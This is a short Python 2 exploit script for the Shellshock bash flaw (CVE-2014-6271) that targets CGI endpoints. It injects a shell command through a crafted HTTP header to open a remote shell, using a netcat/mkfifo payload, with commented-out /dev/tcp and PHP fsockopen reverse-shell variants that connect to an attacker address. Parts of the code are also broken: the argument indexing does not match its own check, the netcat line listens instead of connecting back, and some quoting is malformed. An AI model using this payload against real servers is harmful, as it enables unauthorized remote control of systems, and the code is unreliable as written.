#CVE-2014-6271 cgi-bin reverse shell
#Included additional reverse shell options, just comment out the ones you don't want.
import httplib,urllib,sys
 
if (len(sys.argv)<5):
        print "Usage: %s <host> <vulnerable CGI> <reverse_shell> <port>" % sys.argv[0]
        print "Example: %s localhost /cgi-bin/test.cgi 1.2.3.4 4444" % sys.argv[0]
        exit(0)

print "Attempting to exploit CVE-2014-6271 on %s" % sys.argv[1] 
print "We will attempt to connect back to %s %s" % (sys.argv[4], sys.argv[5])
conn = httplib.HTTPConnection(sys.argv[1])
reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" %(sys.argv[4], sys.argv[5])
#reverse_shell=() { ignored;};/bin/bash -i >& /dev/tcp/%s%s 0>&1" % (sys.argv[4], sys.argv[5])
#reverse_shell="() { ignored'};/bin/bash -c 'php -r '$sock=fsockopen("%s", %s);exec("/bin/sh -i <&3 >&3 2>&3");'" %(sys.argv[4], sys.argv[5])
headers = {"Content-type": "application/x-www-form-urlencoded",
        "X-Forwarded-For":reverse_shell }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print "The server responded: "+res.status+" "+res.reason
data = res.read()
print data
